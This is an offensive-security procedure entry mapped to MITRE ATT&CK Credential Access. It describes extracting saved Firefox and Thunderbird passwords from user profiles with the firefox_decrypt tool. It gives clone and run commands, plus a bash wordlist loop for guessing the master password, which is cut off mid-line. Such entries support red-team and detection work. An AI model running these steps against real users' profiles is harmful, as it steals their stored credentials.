---
id: 94290888-4810-436c-9805-6288d3fee4e7
name: Extract Firefox/Thunderbird Passwords from Profiles
type: procedure
verified: false
submitted: false
created_at: '2019-10-23T21:39:44.833818+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials from Web Browsers]]'
platforms:
- Linux
- Windows
tags:
- '[[Brute Force]]'
- '[[Cryptography]]'
- '[[data exposure]]'
commands:
- '[[Firefox Decrypt Extract Passwords from a Profile]]'
---

# Extract Firefox/Thunderbird Passwords from Profiles

## Summary

Firefox and Thunderbird include the ability to save passwords in the user profiles. While a user's passwords are protected by a master password, attackers who know or can guess the user's master password can easily extract all of the user's saved passwords. 

## Description

# Description

Firefox and Thunderbird include the ability to save passwords in the user profiles. While a user's passwords are protected by a master password, attackers who know or can guess the user's master password can easily extract all of the user's saved passwords.



# Instructions



1. Download Firefox Decrypt



**Code**: [[git clone https://github.com/unode/firefox_decrypt]]



2. Run Firefox Decrypt, specifying the directory containing the profiles.ini file (typically /home/user/.mozilla/firefox or /home/user/.mozilla/thunderbird)





**Command** ([[Firefox Decrypt Extract Passwords from a Profile]]):

```bash
python firefox_decrypt.py $DEST_DIRECTORY
```





Though Firefox Decrypt does not include a brute forcing utility, it can be scripted in Bash using a wordlist.





**Code**: [[for guess in $(cat $_WORDLIST); do echo $guess | p]]





## Platforms

- Linux
- Windows

## Products

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials from Web Browsers]]

## Commands Used

- [[Firefox Decrypt Extract Passwords from a Profile]]

## Tags

- [[Brute Force]]
- [[Cryptography]]
- [[data exposure]]


